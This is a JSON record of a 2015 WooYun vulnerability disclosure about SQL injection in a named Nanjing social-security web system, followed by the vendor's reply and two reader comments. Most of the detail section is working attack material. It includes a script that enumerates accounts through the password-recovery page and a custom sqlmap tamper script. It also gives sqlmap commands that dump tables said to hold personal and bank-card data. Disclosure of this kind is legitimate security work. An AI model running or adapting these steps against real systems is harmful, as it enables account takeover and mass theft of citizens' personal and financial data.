{"id": 23912, "wybug_id": "wooyun-2015-0111454", "wybug_title": "南京某社保系统存在注入漏洞(涉及海量数据包括个人信息、银行卡号等信息)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "bfox", "wybug_date": "2015-05-11 10:38", "wybug_open_date": "2015-06-28 17:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向公众公开  简要描述： 南京某社保系统存在注入漏洞(涉及海量数据包括个人信息、银行卡号等信息) 详细说明：  通过社会工程学，利用密码找回功能的缺陷，发现某用户的口令。然后进行查询就业登记备案情况，拦截请求，发现直接传递编码后的sql语句。导致注射漏洞的产生。\n\n\n\n   漏洞证明：  通过找回密码功能，发现用户口令程序的代码如下：\n#coding:utf-8import requestsfrom bs4 import BeautifulSoupprefix = '0000'addr = 'http://wsbs.njhrss.gov.cn/NJLD/web/FindPad1.jsp'customh = {'Rost':'wsbs.njhrss.gov.cn','Content-Type':'application/x-www-form-urlencoded',}keyword1 = u'没有此注册用户'keyword2 = u'您未设置密码找回问题'for userid in xrange(6000, 7001):    username = prefix + str(userid)    param = { 'userid':username }    r = requests.post(addr, data=param, headers=customh)    if keyword1 not in r.text:       #print username       if keyword2 not in r.text:           #print username           root = BeautifulSoup(r.content)           qlist = root.find('td', attrs = {'width':'62%'}).getText()           print username, qlist\n运行结果如下：\n\n 发现用户00006477的密码问题为111,猜测答案为111。发现该用户的口令为：\n\n 登录后查询就业登记情况，截取请求，截图如下： \n\n对sqlin参数进行解码，发现为sql语句：\n\n肯定存在sql注入了。定制tamper，发现注入漏洞Tamper的源代码如下：root@promote:~# cat /usr/share/sqlmap/tamper/njsbb.py\n#!/usr/bin/env python\"\"\"Copyright (c) 2006-2014 sqlmap developers (http://sqlmap.org/)See the file 'doc/COPYING' for copying permission\"\"\"from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    \"\"\"    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    \"\"\"    #retVal = payload    pos = payload.lower().find('select')    payload = payload[pos:]    #print payload    retVal = payload    if payload:        retVal = \"\"        quote, doublequote, firstspace = False, False, False    for i in xrange(len(payload)):        c = payload[i]        retVal += '@' + c.encode('hex').zfill(4)return  retVal\n运行sqlmap，命令如下：sqlmap -r /root/request.txt --tamper njsbb.py --dbms oracle -p sqlin --technique=U --level 5\n\n列数据库sqlmap -r /root/request.txt --tamper njsbb.py --dbms oracle -p sqlin –dbs \n\n列表\n<code>\n</code>sqlmap -r /root/request.txt --tamper njsbb.py --dbms oracle -p sqlin -D HR –tables \n\n列内容sqlmap -r /root/request.txt --tamper njsbb.py --dbms oracle -p sqlin -D HR -T EMPLOYEES --dump --start 1 --stop 2 \n\nsqlmap -r /root/request.txt --tamper njsbb.py --dbms oracle -p sqlin -D JGCW -T HDB --dump --start 1 --stop 10 \n\n问题与后果1、\t海量的数据库可以被脱裤。当前数据库7000多张表。2、\t数据库的版本为Oracle的9，应该可以提权和执行命令，没有测试3、\t测试的页面存访问控制问题，没有会话信息也可以访问。4、\t安全性只能呵呵。   修复方案：  通用的漏洞，检查其它的地方，有无类似的问题。不要头疼医头。   版权声明：转载请注明来源 bfox@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-05-14 17:29 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给江苏分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-29 00:46 |    \t\t@sdf \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | @sdf)\t\t \n  学习了，感觉好厉害！    \n     2015-07-23 15:00 |    \t\t雏鹰 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 关注互联网的那些事、关注web安全、关注安...)\t\t \n  顶！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}